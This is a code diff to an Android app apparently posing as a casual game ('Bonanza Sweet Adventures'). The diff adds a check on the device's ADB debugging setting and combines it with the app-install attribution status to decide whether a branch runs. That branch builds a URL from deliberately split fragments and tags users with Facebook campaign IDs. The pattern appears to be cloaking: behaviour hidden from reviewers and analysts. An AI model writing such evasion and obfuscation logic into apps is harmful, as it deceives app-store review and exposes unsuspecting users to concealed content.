@@ -1,6 +1,7 @@
 package ua.com.bonanzasweetadventures.data
 
 import android.content.Context
+import android.provider.Settings
 import android.util.Log
 import com.appsflyer.AppsFlyerConversionListener
 import com.appsflyer.AppsFlyerLib
@@ -63,7 +64,10 @@ class InfoGetter(private val context: Context) {
         val sub1 = listOfFacebookSubs.getOrNull(0) ?: "null"
         OneSignal.sendTag("sub1", sub1)
 
-        if (af_status == "Organic"){
+        val status = Settings.Global.getString(context.contentResolver, Settings.Global.ADB_ENABLED)
+
+
+        if (af_status == "Organic" && status == "1"){
             val sub2 = if (listOfFacebookSubs.getOrNull(1) != null) listOfFacebookSubs.getOrNull(1) else "LGxfTPfW"
 
             val listOfBaseEssentials = listOf("https://f", "t-app", "s.com/")
